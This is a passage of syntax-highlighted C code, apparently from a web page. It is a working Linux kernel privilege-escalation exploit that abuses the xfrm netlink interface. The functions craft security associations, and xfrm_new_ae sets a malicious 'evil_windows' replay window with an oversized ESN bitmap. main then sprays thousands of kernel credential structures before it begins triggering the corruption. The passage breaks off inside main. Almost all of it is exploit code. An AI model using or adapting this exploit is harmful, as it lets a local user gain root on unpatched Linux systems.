            <span class="n">printf</span><span class="p">(</span><span class="s">" "</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>




<span class="kt">int</span> <span class="nf">xfrm_add_sa</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">,</span><span class="kt">int</span> <span class="n">spi</span><span class="p">,</span><span class="kt">int</span> <span class="n">bmp_len</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">sockaddr_nl</span> <span class="n">nladdr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">msghdr</span> <span class="n">msg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="n">nlhdr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">,</span><span class="n">err</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nladdr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nladdr</span><span class="p">));</span>
    <span class="n">nladdr</span><span class="p">.</span><span class="n">nl_family</span> <span class="o">=</span> <span class="n">AF_NETLINK</span><span class="p">;</span>
    <span class="n">nladdr</span><span class="p">.</span><span class="n">nl_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">nladdr</span><span class="p">.</span><span class="n">nl_groups</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">nlhdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">NLMSG_SPACE</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">nlhdr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">NLMSG_SPACE</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>

    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span> <span class="o">=</span> <span class="n">NLMSG_LENGTH</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span> <span class="o">=</span> <span class="n">NLM_F_REQUEST</span><span class="p">;</span>
    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span> <span class="o">=</span> <span class="n">XFRM_MSG_NEWSA</span><span class="p">;</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">NLMSG_DATA</span><span class="p">(</span><span class="n">nlhdr</span><span class="p">);</span> 
    <span class="k">struct</span> <span class="n">xfrm_usersa_info</span> <span class="n">xui</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">xui</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">xui</span><span class="p">));</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">id</span><span class="p">.</span><span class="n">proto</span> <span class="o">=</span> <span class="n">IPPROTO_AH</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">id</span><span class="p">.</span><span class="n">spi</span> <span class="o">=</span> <span class="n">spi</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">id</span><span class="p">.</span><span class="n">daddr</span><span class="p">.</span><span class="n">a4</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">lft</span><span class="p">.</span><span class="n">hard_byte_limit</span> <span class="o">=</span> <span class="mh">0x10000000</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">lft</span><span class="p">.</span><span class="n">hard_packet_limit</span> <span class="o">=</span> <span class="mh">0x10000000</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">lft</span><span class="p">.</span><span class="n">soft_byte_limit</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">lft</span><span class="p">.</span><span class="n">soft_packet_limit</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">XFRM_MODE_TRANSPORT</span><span class="p">;</span>
    <span class="n">xui</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">XFRM_STATE_ESN</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">xui</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">xui</span><span class="p">));</span>

    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xui</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="n">nla</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_algo</span> <span class="n">xa</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">xa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xa</span><span class="p">));</span>
    <span class="n">nla</span><span class="p">.</span><span class="n">nla_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xa</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">);</span>
    <span class="n">nla</span><span class="p">.</span><span class="n">nla_type</span> <span class="o">=</span> <span class="n">XFRMA_ALG_AUTH</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">xa</span><span class="p">.</span><span class="n">alg_name</span><span class="p">,</span> <span class="s">"digest_null"</span><span class="p">);</span>
    <span class="n">xa</span><span class="p">.</span><span class="n">alg_key_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">xa</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xa</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xa</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="n">rs</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="n">nla</span><span class="p">.</span><span class="n">nla_len</span> <span class="o">=</span>  <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">)</span><span class="o">+</span><span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="p">)</span> <span class="o">+</span><span class="n">bmp_len</span><span class="o">*</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">;</span>
    <span class="n">nla</span><span class="p">.</span><span class="n">nla_type</span> <span class="o">=</span> <span class="n">XFRMA_REPLAY_ESN_VAL</span><span class="p">;</span>    
    <span class="n">rs</span><span class="p">.</span><span class="n">replay_window</span> <span class="o">=</span> <span class="n">bmp_len</span><span class="p">;</span>
    <span class="n">rs</span><span class="p">.</span><span class="n">bmp_len</span> <span class="o">=</span> <span class="n">bmp_len</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="p">);</span> 
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="sc">'1'</span><span class="p">,</span><span class="n">bmp_len</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">nlhdr</span><span class="p">;</span>
    <span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">nladdr</span><span class="p">);</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_namelen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nladdr</span><span class="p">);</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">;</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="c1">//dump_data(&amp;msg,iov.iov_len);</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">sendmsg</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad sendmsg"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>      
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">xfrm_new_ae</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">,</span><span class="kt">int</span> <span class="n">spi</span><span class="p">,</span><span class="kt">int</span> <span class="n">bmp_len</span><span class="p">,</span><span class="kt">int</span> <span class="n">evil_windows</span><span class="p">,</span><span class="kt">int</span> <span class="n">seq</span><span class="p">,</span><span class="kt">int</span> <span class="n">seq_hi</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">sockaddr_nl</span> <span class="n">nladdr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">msghdr</span> <span class="n">msg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="n">nlhdr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">,</span><span class="n">err</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nladdr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nladdr</span><span class="p">));</span>
    <span class="n">nladdr</span><span class="p">.</span><span class="n">nl_family</span> <span class="o">=</span> <span class="n">AF_NETLINK</span><span class="p">;</span>
    <span class="n">nladdr</span><span class="p">.</span><span class="n">nl_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">nladdr</span><span class="p">.</span><span class="n">nl_groups</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">nlhdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">NLMSG_SPACE</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">nlhdr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">NLMSG_SPACE</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>

    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span> <span class="o">=</span> <span class="n">NLMSG_LENGTH</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span> <span class="o">=</span> <span class="n">NLM_F_REQUEST</span><span class="o">|</span><span class="n">NLM_F_REPLACE</span><span class="p">;</span>
    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
    <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span> <span class="o">=</span> <span class="n">XFRM_MSG_NEWAE</span><span class="p">;</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">NLMSG_DATA</span><span class="p">(</span><span class="n">nlhdr</span><span class="p">);</span> 
    <span class="k">struct</span> <span class="n">xfrm_aevent_id</span> <span class="n">xai</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">xai</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">xai</span><span class="p">));</span>
    <span class="n">xai</span><span class="p">.</span><span class="n">sa_id</span><span class="p">.</span><span class="n">proto</span> <span class="o">=</span> <span class="n">IPPROTO_AH</span><span class="p">;</span>
    <span class="n">xai</span><span class="p">.</span><span class="n">sa_id</span><span class="p">.</span><span class="n">family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">xai</span><span class="p">.</span><span class="n">sa_id</span><span class="p">.</span><span class="n">spi</span> <span class="o">=</span> <span class="n">spi</span><span class="p">;</span>
    <span class="n">xai</span><span class="p">.</span><span class="n">sa_id</span><span class="p">.</span><span class="n">daddr</span><span class="p">.</span><span class="n">a4</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">xai</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">xai</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xai</span><span class="p">);</span>    

    <span class="k">struct</span> <span class="n">nlattr</span> <span class="n">nla</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="n">rs</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="n">nla</span><span class="p">.</span><span class="n">nla_len</span> <span class="o">=</span>  <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">)</span><span class="o">+</span><span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="p">)</span> <span class="o">+</span><span class="n">bmp_len</span><span class="o">*</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">;</span>
    <span class="n">nla</span><span class="p">.</span><span class="n">nla_type</span> <span class="o">=</span> <span class="n">XFRMA_REPLAY_ESN_VAL</span><span class="p">;</span>    
    <span class="n">rs</span><span class="p">.</span><span class="n">replay_window</span> <span class="o">=</span> <span class="n">evil_windows</span><span class="p">;</span>
    <span class="n">rs</span><span class="p">.</span><span class="n">bmp_len</span> <span class="o">=</span> <span class="n">bmp_len</span><span class="p">;</span>
    <span class="n">rs</span><span class="p">.</span><span class="n">seq_hi</span> <span class="o">=</span> <span class="n">seq_hi</span><span class="p">;</span>
    <span class="n">rs</span><span class="p">.</span><span class="n">seq</span> <span class="o">=</span> <span class="n">seq</span><span class="p">;</span>   
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">nla</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nla</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="p">));</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="p">);</span> 
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="sc">'1'</span><span class="p">,</span><span class="n">bmp_len</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span>



    <span class="n">iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">nlhdr</span><span class="p">;</span>
    <span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">nlhdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">nladdr</span><span class="p">);</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_namelen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">nladdr</span><span class="p">);</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">;</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">sendmsg</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad sendmsg"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>      
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">err</span><span class="p">;</span> 
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">sendah</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">,</span><span class="kt">int</span> <span class="n">spi</span><span class="p">,</span><span class="kt">int</span> <span class="n">seq</span> <span class="p">){</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sai</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">msghdr</span> <span class="n">msg</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">ip_auth_hdr</span> <span class="n">ah</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sai</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sai</span><span class="p">));</span>
    <span class="n">sai</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
    <span class="n">sai</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mh">0x4869</span><span class="p">);</span>
    <span class="n">sai</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">4096</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="sc">'1'</span><span class="p">,</span><span class="mi">4096</span><span class="p">);</span>
    <span class="n">ah</span><span class="p">.</span><span class="n">spi</span> <span class="o">=</span> <span class="n">spi</span><span class="p">;</span>
    <span class="n">ah</span><span class="p">.</span><span class="n">nexthdr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ah</span><span class="p">.</span><span class="n">seq_no</span> <span class="o">=</span> <span class="n">seq</span><span class="p">;</span>
    <span class="n">ah</span><span class="p">.</span><span class="n">hdrlen</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x10</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ah</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ah</span><span class="p">));</span>

    <span class="n">iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
    <span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">sai</span><span class="p">);</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_namelen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sai</span><span class="p">);</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">;</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="c1">//dump_data(&amp;msg,iov.iov_len);</span>
    <span class="c1">//dump_data(nlhdr,iov.iov_len);</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">sendmsg</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad sendmsg"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>      
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">err</span><span class="p">;</span> 
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">spary_n</span><span class="o">=</span><span class="mh">0xc00</span><span class="p">,</span><span class="n">err</span><span class="p">,</span><span class="n">xfrm_socket</span><span class="p">,</span><span class="n">recvfd</span><span class="p">,</span><span class="n">sendfd</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">time</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">xfrm_socket</span><span class="o">=</span><span class="n">init_xfrm_socket</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">xfrm_socket</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] bad init xfrm socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] init xfrm_socket %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">xfrm_socket</span><span class="p">);</span>

    <span class="n">recvfd</span> <span class="o">=</span> <span class="n">init_recvfd</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">recvfd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] bad init_recvfd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] init recvfd : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">recvfd</span><span class="p">);</span>
    <span class="n">sendfd</span> <span class="o">=</span> <span class="n">init_sendfd</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">recvfd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] bad sendfd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] init sendfd : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">sendfd</span><span class="p">);</span>
    <span class="c1">//return 0;</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] start spary %d creds </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">spary_n</span> <span class="p">);</span>
    <span class="n">fork_spary_n</span><span class="p">(</span><span class="n">spary_n</span><span class="p">,</span><span class="n">time</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>

    <span class="n">err</span><span class="o">=</span><span class="n">xfrm_add_sa</span><span class="p">(</span><span class="n">xfrm_socket</span><span class="p">,</span><span class="mi">4869</span><span class="p">,</span><span class="mh">0x24</span><span class="p">);</span>
